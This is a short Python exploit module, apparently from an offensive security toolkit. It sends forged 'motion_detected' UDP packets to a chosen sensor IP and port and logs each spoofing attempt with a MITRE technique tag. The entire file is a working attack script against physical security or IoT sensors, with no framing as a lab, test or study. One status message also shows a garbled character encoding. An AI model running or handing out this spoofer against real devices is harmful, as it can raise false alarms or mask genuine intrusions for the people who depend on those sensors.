# modules/exploits/motion_sensor_spoofer.py

import argparse
import time
import json
import os
from datetime import datetime
import socket

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1204"  # User Execution (Spoofed physical input)

def log_spoof(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_fake_trigger(ip, port, payload):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(payload.encode(), (ip, port))
        sock.close()
        return True
    except Exception as e:
        print(f"[!] Failed to spoof: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Motion Sensor Spoofing Module")
    parser.add_argument("--target-ip", required=True, help="Target sensor IP")
    parser.add_argument("--port", type=int, default=4000, help="Target UDP port")
    parser.add_argument("--message", default="motion_detected", help="Fake payload to send")
    args = parser.parse_args()

    success = send_fake_trigger(args.target_ip, args.port, args.message)

    log_spoof({
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": args.target_ip,
        "port": args.port,
        "message": args.message,
        "success": success,
        "ttp": MITRE_TTP
    })

    if success:
        print(f"[âœ“] Fake motion alert sent to {args.target_ip}:{args.port}")
    else:
        print("[!] Motion spoofing failed")
